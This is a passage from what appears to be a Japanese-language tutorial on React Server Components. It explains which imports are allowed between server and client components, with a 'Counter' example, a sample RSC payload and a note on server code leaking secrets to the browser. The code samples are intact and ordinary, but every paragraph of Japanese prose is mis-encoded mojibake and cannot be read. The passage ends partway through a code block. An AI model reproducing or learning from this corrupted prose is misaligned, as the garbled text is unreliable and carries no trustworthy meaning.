<p>ã“ã‚Œã‚’å®Ÿç¾ã™ã‚‹å½¹å‰²ã‚’æ‹…ã†ã®ãŒãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¨ãƒãƒ³ãƒ‰ãƒ©ã§ã™ã€‚ã—ã‹ã—ã€æŠ½è±¡åŒ–ã¯ã‚³ã‚¹ãƒˆã‚’ä¼´ã†ã“ã¨ã‚’å¿˜ã‚Œã¦ã¯ã„ã‘ã¾ã›ã‚“ã€‚æŠ½è±¡åŒ–ã‚’åˆ©ç”¨ã™ã‚‹ãŸã‚ã«ç‰¹åˆ¥ãªãƒ«ãƒ¼ãƒ«ã‚’å­¦ã°ãªãã¦ã¯ã„ã‘ãªã„ã“ã¨ãŒã‚³ã‚¹ãƒˆã§ã‚ã‚‹ã“ã¨ã‚‚å°‘ãªãã‚ã‚Šã¾ã›ã‚“ã€‚ã“ã®å ´åˆã€ã‚µãƒ¼ãƒãƒ¼ã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®éš”ãŸã‚Šã‚’ã‚ã‚‹ç¨‹åº¦æŠ½è±¡åŒ–ã—ã€æ°—ã«ãªã‚‰ãªã„ã‚ˆã†ã«ã™ã‚‹ã«ã¯ã€æŠ½è±¡åŒ–ã®åˆ¶é™ã‚’ç ´ã‚‰ãªã„ã‚ˆã†ãƒ«ãƒ¼ãƒ«ã«å¾“ã†å¿…è¦ãŒã‚ã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚</p>
<p>RSCã®ã‚±ãƒ¼ã‚¹ã§ã¯ã€è€ƒæ…®ã™ã¹ãã‚¤ãƒ³ã‚¿ãƒ¼ãƒªãƒ¼ãƒ“ãƒ³ã‚°ã®ã‚·ãƒŠãƒªã‚ªãŒ3ã¤ã‚ã‚Šã¾ã™ã€‚ãƒ«ãƒ¼ãƒ«ã¯ã€ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒå®Ÿè¡Œã•ã‚Œã‚‹å ´æ‰€ã«å¿œã˜ã¦ä½•ã‚’ã€Œã‚¤ãƒ³ãƒãƒ¼ãƒˆã€ã§ãã‚‹ã‹ã«é–¢ã‚ã‚‹ã‚‚ã®ã§ã€æŒ‡ç¤ºã‚„ã‚¤ãƒ³ãƒãƒ¼ãƒˆã‚’åˆ†æã—ã¦ã¾ã¨ã‚ã‚‹ãƒãƒ³ãƒ‰ãƒ©ã¨RSCãŒã©ã®ã‚ˆã†ã«é€£æºã™ã‚‹ã‹ã«åŸºã¥ã„ã¦ã„ã¾ã™ã€‚</p>
<h3>Client Components ã‚’ Server Components ã«ã‚¤ãƒ³ãƒãƒ¼ãƒˆ</h3>
<p>ã“ã®ã‚¤ãƒ³ãƒãƒ¼ãƒˆã¯å¯èƒ½ã§ã™ã€‚ãã‚ŒãŒå¯èƒ½ã§ã‚ã‚‹ã®ã¯ç†ã«ã‹ãªã£ã¦ã„ã¾ã™ã€‚ãƒãƒ³ãƒ‰ãƒ©ã¯ã‚¤ãƒ³ãƒãƒ¼ãƒˆã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆã‚’è¦‹ã¦ã€ã©ã®ã‚³ãƒ¼ãƒ‰ã‚’ãƒãƒ³ãƒ‰ãƒ«ã«å«ã‚ã€ã©ã®ã‚³ãƒ¼ãƒ‰ãŒã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«ã‚ˆã£ã¦ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹ã‹ã‚’åˆ¤æ–­ã—ã¾ã™ã€‚</p>
<p>RSCã‚‚ä»®æƒ³DOMã®æ§‹ç¯‰ã«å‚åŠ ã—ã¾ã™ã€‚Client Componentã‚³ãƒ¼ãƒ‰ãŒãƒãƒ³ãƒ‰ãƒ«ã«å«ã¾ã‚Œãƒ–ãƒ©ã‚¦ã‚¶ã«æ¸¡ã•ã‚Œã‚‹ãŸã‚ã€ãƒ„ãƒªãƒ¼ã«å«ã¾ã‚Œã‚‹Client Componentsã‚’å‚ç…§ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<p>Reactã‚³ãƒ¼ã‚¹ã¸ã®ç™»éŒ²ãƒšãƒ¼ã‚¸ã«ã‚¹ãƒ†ãƒ¼ãƒˆãƒ•ãƒ«ãª<code class="language-text">Counter</code>ã‚’è¿½åŠ ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// components/Counter.js</span>
<span class="token string">'use client'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Counter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span><span class="token punctuation">></span></span><span class="token plain-text">
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
                Enroll
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// page.js</span>
<span class="token keyword">import</span> Counter <span class="token keyword">from</span> <span class="token string">"./components/Counter"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> DelayedMessage <span class="token keyword">from</span> <span class="token string">"./components/DelayedMessage"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Suspense <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Home</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">understandingreact.com</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Counter</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Suspense</span></span> <span class="token attr-name">fallback</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">Loading...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">DelayedMessage</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Suspense</span></span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ãƒ•ã‚¡ã‚¤ãƒ«ä¸Šéƒ¨ã«<code class="language-text">use client</code>ã¨ã„ã†æŒ‡ç¤ºãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯Reactã®æ©Ÿèƒ½ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãƒ„ãƒªãƒ¼ã®ä¸€éƒ¨ã‚’ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆä¸Šã§å®Ÿè¡Œã™ã‚‹å ´åˆã¯ã€ãƒãƒ¼ã‚­ãƒ³ã‚°ã™ã‚‹ã“ã¨ãŒãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ã®é–“ã§ã¯æš—é»™ã®äº†è§£ã«ãªã£ã¦ã„ã¾ã™ã€‚</p>
<p>ãã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¨ã€ãã‚Œã«ã‚¤ãƒ³ãƒãƒ¼ãƒˆã•ã‚Œã‚‹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒã€Client Componentsã¨ã—ã¦ãƒãƒ³ãƒ‰ãƒ«ã•ã‚Œã¾ã™ã€‚</p>
<p>ãƒãƒ³ãƒ‰ãƒ©ã¯<code class="language-text">use client</code>ã®æŒ‡ç¤ºã‚’ç¢ºèªã—ã€ãã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆï¼ˆãŠã‚ˆã³ã‚¤ãƒ³ãƒãƒ¼ãƒˆã•ã‚Œã‚‹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆï¼‰ã®ã‚³ãƒ¼ãƒ‰ã‚’ãƒ–ãƒ©ã‚¦ã‚¶ãŒãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ãƒãƒ³ãƒ‰ãƒ«ã«å«ã‚ã¾ã™ã€‚</p>
<p><code class="language-text">Home</code> RSCãŠã‚ˆã³<code class="language-text">DelayedMessage</code> RSCã¯ã‚µãƒ¼ãƒãƒ¼ä¸Šã§å®Ÿè¡Œã•ã‚Œã‚‹ãŸã‚ã€ã“ã‚Œã‚‰ã®ã‚³ãƒ¼ãƒ‰ã¯ãƒãƒ³ãƒ‰ãƒ«ã«å«ã¾ã‚Œã¾ã›ã‚“ã€‚ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰é€ã‚‰ã‚Œã‚‹Payloadã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token punctuation">{</span>
  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"main"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
  <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
   <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"h1"</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"understandingreact.com"</span>
     <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"d"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Lazy node"</span>
     <span class="token punctuation">}</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"e"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
      <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Reference"</span>
     <span class="token punctuation">}</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"fallback"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"p"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
       <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"Loading..."</span>
       <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"f"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Lazy node"</span>
      <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
   <span class="token punctuation">]</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Client ComponentãŒæŒ¿å…¥ã•ã‚Œã‚‹å ´æ‰€ã«ã€Œé…å»¶èª­ã¿è¾¼ã¿ï¼ˆLazy nodeï¼‰ã€ã®ãƒªãƒ•ã‚¡ãƒ¬ãƒ³ã‚¹ãŒæ–°ãŸã«è¿½åŠ ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã«æ³¨ç›®ã—ã¦ãã ã•ã„ã€‚ä»®æƒ³DOMã®å½“è©²éƒ¨åˆ†ã¯ã€ãã®Client ComponentãŒå®Ÿè¡Œã•ã‚Œã‚‹ã¨ãã«åˆ†ã‹ã‚Šã¾ã™ã€‚ã¤ã¾ã‚Šã€Client ComponentãŒã‚µãƒ¼ãƒãƒ¼ä¸Šã§ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ï¼ˆãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ãŒå¯¾å¿œã—ã¦ã„ã‚‹å ´åˆï¼‰ã•ã‚Œã‚‹ã‹ã€ãƒ–ãƒ©ã‚¦ã‚¶ä¸Šã§å®Ÿè¡Œã•ã‚Œã‚‹ã¨ãã§ã™ã€‚</p>
<p>ã‚‚ã†ä¸€ã¤è¿°ã¹ã¦ãŠããŸã„ã®ãŒã€Server Componentã‹ã‚‰Client Componentã«propsã‚’æ¸¡ã™å ´åˆã€ãã®propsã¯<a href="https://react.dev/reference/rsc/use-server#serializable-parameters-and-return-values">Reactã«ã‚ˆã£ã¦ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹å¿…è¦</a>ãŒã‚ã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚</p>
<p>ã™ã§ã«è¦‹ã¦ããŸã‚ˆã†ã«ã€propsã¯ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚’ä»‹ã—ã¦é€ä¿¡ã•ã‚Œã‚‹Payloadã«å«ã¾ã‚Œã¾ã™ã€‚ã¤ã¾ã‚Šã€ãƒ‡ãƒ¼ã‚¿ã¯å…¨ã¦æ–‡å­—åˆ—ã¨ã—ã¦æ¸¡ã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®ãƒ¡ãƒ¢ãƒªä¸Šã§ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«å¾©å…ƒã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚</p>
<h3>Client Componentsã¸ã®Server Componentsã®ã‚¤ãƒ³ãƒãƒ¼ãƒˆ</h3>
<p>ã“ã®ã‚¤ãƒ³ãƒãƒ¼ãƒˆã¯èªã‚ã‚‰ã‚Œã¾ã›ã‚“ã€‚ã‚µãƒ¼ãƒãƒ¼ä¸Šã§å®Ÿè¡Œã•ã‚Œã‚‹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ã€ãƒ–ãƒ©ã‚¦ã‚¶ä¸Šã§å®Ÿè¡Œã•ã‚Œã‚‹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã«ã‚¤ãƒ³ãƒãƒ¼ãƒˆã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚</p>
<p>ãªãœã‹ã¨è¨€ã†ã¨ã€ãƒãƒ³ãƒ‰ãƒ©ãŒã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ä¿¡ã™ã‚‹ã®ã¯Payloadã®ã¿ã§ã‚ã‚Šã€RSCé–¢æ•°ã¯é€ä¿¡ã™ã‚‹ã¹ãã§ã¯ãªã„ã‹ã‚‰ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€ã‚¤ãƒ³ãƒãƒ¼ãƒˆã™ã‚‹ã‚³ãƒ¼ãƒ‰ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ãƒãƒ³ãƒ‰ãƒ©ã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã‚‹ã‚ˆã†ã«ã‚³ãƒ¼ãƒ‰ã‚’å«ã‚ã‚‹ã“ã¨ã¯ãªã„ãŸã‚ã€ä½¿ç”¨ã§ãã‚‹RSCã‚³ãƒ¼ãƒ‰ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚</p>
<p>ã‚µãƒ¼ãƒãƒ¼ã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®ä¸¡æ–¹ã§å®Ÿè¡Œå¯èƒ½ãªå…±æœ‰ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã™ã‚‹ã“ã¨ã¯å¯èƒ½ã§ã™ã€‚ã—ã‹ã—ã€Client Componentã«å…±æœ‰ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã™ã‚‹å ´åˆã€ãã®ã‚³ãƒ¼ãƒ‰ã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã‚‹ã‚ˆã†ãƒãƒ³ãƒ‰ãƒ«ã•ã‚Œã¾ã™ã€‚Server Componentã«å…±æœ‰ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã™ã‚‹å ´åˆã¯ãƒãƒ³ãƒ‰ãƒ«ã•ã‚Œã¾ã›ã‚“ã€‚</p>
<p>ã€Œé–“é•ã£ã¦Server Componentã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã—ãŸå ´åˆã€ãƒãƒ³ãƒ‰ãƒ©ã¯ãã‚ŒãŒé–“é•ã„ã ã¨åˆ†ã‹ã‚‹ã®ã‹ã€ã¨ç–‘å•ã«æ€ã†ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚</p>
<p>ã“ã‚Œã¯å¦¥å½“ãªç–‘å•ã§ã™ã€‚ã“ã‚Œã¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®å•é¡Œã§ã‚‚ã‚ã‚Šã¾ã™ã€‚ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã¦ä»–äººã®ç›®ã«è§¦ã‚Œã‚‹ã“ã¨ã‚’æƒ³å®šã—ã¦ã„ãªã„ã‚³ãƒ¼ãƒ‰ãŒServer Componentã«å«ã¾ã‚Œã‚‹å ´åˆã€é–“é•ã£ã¦Client Componentã«ã‚¤ãƒ³ãƒãƒ¼ãƒˆã—ã€ãƒãƒ³ãƒ‰ãƒ«ã•ã‚Œã¦ã—ã¾ã†ã“ã¨ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã‚µãƒ¼ãƒãƒ¼å›ºæœ‰ã®æ©Ÿèƒ½ï¼ˆãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¸ã®æ¥ç¶šãªã©ï¼‰ãŒå«ã¾ã‚Œã‚‹å ´åˆã€ãƒ–ãƒ©ã‚¦ã‚¶ä¸Šã§å®Ÿè¡Œã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ãŒã€ãã®ã¾ã¾æœ¬ç•ªç’°å¢ƒã«ãƒªãƒªãƒ¼ã‚¹ã•ã‚Œã¦ã—ã¾ã†ã¨ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãªã©ã®æ©Ÿå¯†æƒ…å ±ãŒæ¼æ´©ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚</p>
<p>Next.jsã¯å¯¾ç­–ã¨ã—ã¦ã€<a href="https://nextjs.org/docs/app/building-your-application/rendering/composition-patterns#keeping-server-only-code-out-of-the-client-environment">ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã«ã€Œã‚µãƒ¼ãƒãƒ¼ã®ã¿ï¼ˆserver-onlyï¼‰ã€ã¨ãƒãƒ¼ã‚­ãƒ³ã‚°ã§ãã‚‹ã‚ˆã†ã«ã—ã¦ã„ã¾ã™</a>ã€‚ã—ã‹ã—ã€ã“ã‚Œã¯ä½•ã‹ã‚’å¿˜ã‚Œãªã„ã‚ˆã†ã«æŒ‡ã«ç´ã‚’çµã³ã¤ã‘ã¦ãŠãã‚ˆã†ãªã‚‚ã®ã§ã™ã€‚ç´ã‚’çµã¶ã®ã‚’å¿˜ã‚Œã¦ã—ã¾ã†ã“ã¨ã‚‚ã‚ã‚Šãˆã¾ã™ã€‚</p>
<p>ä»–ã®ãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯ã€ã‚µãƒ¼ãƒãƒ¼ã®ã‚³ãƒ¼ãƒ‰ãŒãƒãƒ³ãƒ‰ãƒ«ã•ã‚Œã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ä¿¡ã•ã‚Œãªã„ã‚ˆã†ã«ã™ã‚‹ã‚ˆã‚Šç¢ºå®Ÿãªæ–¹æ³•ã‚’æ¤œè¨ã—ã¦ã„ã¾ã™ã€‚</p>
<p>ã—ã‹ã—ã€ä¸€åº¦ã‚µãƒ¼ãƒãƒ¼ã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®å¢ƒç•Œã‚’æŠ½è±¡åŒ–ã—ã¦ã—ã¾ã†ã¨ã€ãã®å¢ƒç•ŒãŒå­˜åœ¨ã™ã‚‹ã“ã¨è‡ªä½“å¿˜ã‚Œã¦ã—ã¾ã†ä¸€å®šã®ãƒªã‚¹ã‚¯ã‚’å—ã‘å…¥ã‚Œã‚‹ã“ã¨ã«ãªã‚Šã¾ã™ã€‚</p>
<h3>Server Componentsã‚’å­ã¨ã—ã¦Client Componentsã«æ¸¡ã™</h3>
<p><strong>ã“ã‚Œã¯å¯èƒ½ã§ã™</strong>ã€‚ã“ã‚Œã¯èˆˆå‘³æ·±ã„ã€ç‰¹æ®Šãªã‚±ãƒ¼ã‚¹ã§ã™ã€‚Server Componentsã‚’<code class="language-text">children</code> propsã¨ã—ã¦Client Componentã«æ¸¡ã™ã“ã¨ã¯ã§ãã¾ã™ã€‚ã“ã‚Œã¯ã‚¤ãƒ³ãƒãƒ¼ãƒˆã¨ã¯ç•°ãªã‚Šã¾ã™ã€‚</p>
<p><code class="language-text">Counter</code>é–¢æ•°ã«childrenã‚’æ¸¡ã—ãŸå ´åˆã€ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// components/Counter.js</span>
<span class="token string">'use client'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Counter</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> children <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span><span class="token punctuation">></span></span><span class="token plain-text">
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
                Enroll
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
            </span><span class="token punctuation">{</span> children <span class="token punctuation">}</span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// page.js</span>
